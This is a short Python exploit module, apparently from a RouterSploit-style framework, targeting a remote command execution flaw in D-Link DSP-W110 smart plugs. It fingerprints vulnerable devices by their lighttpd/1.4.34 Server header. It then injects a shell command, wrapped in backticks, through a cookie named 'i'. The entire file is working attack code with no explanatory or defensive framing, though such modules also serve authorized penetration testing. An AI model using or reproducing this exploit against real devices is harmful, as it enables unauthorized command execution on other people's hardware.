# rsf exploit module
# description: Module exploits RCE vulnerability in D-Link DSP-W110 devices
import requests

def execute(target, port, cmd):
    try:
        if len(cmd) > 18:
            return False
        cookies = {"i": f"`{cmd}`"}
        requests.get(f"http://{target}:{port}/", cookies=cookies, timeout=5)
        return True
    except:
        return False

def check(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/", timeout=5)
        return response.status_code == 200 and "Server" in response.headers and "lighttpd/1.4.34" in response.headers['Server']
    except:
        return False
